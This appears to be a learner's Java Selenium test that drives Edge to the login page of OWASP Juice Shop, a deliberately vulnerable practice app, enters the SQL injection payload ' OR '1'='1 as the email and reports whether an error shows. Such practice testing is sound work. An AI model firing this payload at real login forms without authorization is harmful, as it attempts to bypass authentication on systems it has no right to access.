package SeleniumJava;

import org.openqa.selenium.By;
import org.openqa.selenium.JavascriptExecutor;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.NoSuchElementException;
import org.openqa.selenium.edge.EdgeDriver;
import org.openqa.selenium.edge.EdgeOptions;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;



import java.time.Duration;

public class SQLiTest {

    public static void main(String[] args) {
        // Set the path to the Edge WebDriver
        System.setProperty("webdriver.edge.driver", "C:\\Users\\CHETANA HAZARE\\Downloads\\edgedriver_win64\\msedgedriver.exe");

        // Create Edge options for headless mode
        EdgeOptions options = new EdgeOptions();
//        options.addArguments("--headless");

        // Initialize the Edge WebDriver
        WebDriver driver = new EdgeDriver(options);

        try {
            driver.get("https://juice-shop.herokuapp.com/#/login");

            WebElement usernameField = driver.findElement(By.id("email"));
            WebElement passwordField = driver.findElement(By.id("password"));

            String sqlInjectionPayload = "' OR '1'='1";

            usernameField.sendKeys(sqlInjectionPayload);
            passwordField.sendKeys("anypassword");

            // Explicit wait to ensure the button is clickable
            WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(10));
            WebElement loginButton = wait.until(ExpectedConditions.elementToBeClickable(By.id("loginButton")));

            // Scroll to the element to make sure it's in view
            ((JavascriptExecutor) driver).executeScript("arguments[0].scrollIntoView(true);", loginButton);

            // Use JavaScript to click the login button
            ((JavascriptExecutor) driver).executeScript("arguments[0].click();", loginButton);

            // Check if there's an error message after the click
            try {
                WebElement errorMessage = driver.findElement(By.className("error"));
                if (errorMessage.isDisplayed()) {
                    System.out.println("SQL Injection attempt failed with error message: " + errorMessage.getText());
                }
            } catch (NoSuchElementException e) {
                System.out.println("No error message found, injection may have succeeded or failed silently.");
            }

        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (driver != null) {
                driver.quit();
            }
        }
    }
}
